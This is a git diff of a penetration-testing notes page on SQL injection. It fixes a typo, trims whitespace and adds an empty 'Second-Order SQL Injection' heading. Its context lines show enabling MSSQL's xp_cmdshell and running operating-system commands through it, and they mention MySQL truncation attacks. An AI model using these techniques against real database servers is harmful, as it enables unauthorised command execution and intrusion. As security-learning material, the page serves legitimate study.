@@ -146,7 +146,7 @@ Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffi
 
 The two main ways for perform a sql-injection: **error based** or **blind**.
 
-### Error-bases DB enumeration
+### Error-based DB enumeration
 
 If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure.
 
@@ -281,19 +281,21 @@ Configuration option 'show advanced options' changed from 0 to 1. Run the RECONF
 Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. 
 (return status = 0) 
 1> reconfigure 
-2> go 
+2> go
 ```
 
 We can then execute commands on the machine in the following manner:
 
 ```sqsh
 1> exec master..xp_cmdshell 'ipconfig' 
-2> go 
+2> go
 ```
+
+### Second-Order SQL Injection
 
 ## Truncating Mysql Vulerability
 
-Basically this happens when you don't validate the length of user input.   
+Basically this happens when you don't validate the length of user input.  
 Two things are needed for it to work:
 
 * Mysql does not make comparisons in binary mode. This means that "admin" and "admin        " are the same.
